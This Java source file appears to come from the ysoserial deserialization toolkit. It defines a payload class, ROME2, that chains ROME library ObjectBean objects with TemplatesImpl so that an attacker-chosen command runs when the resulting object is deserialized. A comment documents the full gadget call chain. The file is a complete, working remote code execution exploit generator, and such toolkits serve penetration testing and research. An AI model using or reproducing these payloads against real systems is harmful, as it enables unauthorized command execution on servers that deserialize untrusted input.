package ysoserial.payloads;


import com.rometools.rome.feed.impl.ObjectBean;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.xml.transform.Templates;

/**
 * Exactly the same as ROME payload, but for the newer version of rome library
 * where package name is changed from com.sun.syndication -> com.rometools.rome
 *
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 *
 */
@Dependencies("rome:rome:1.5.1")
@Authors({ Authors.MBECHLER })
public class ROME2 implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }

    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ROME2.class, args);
    }

}
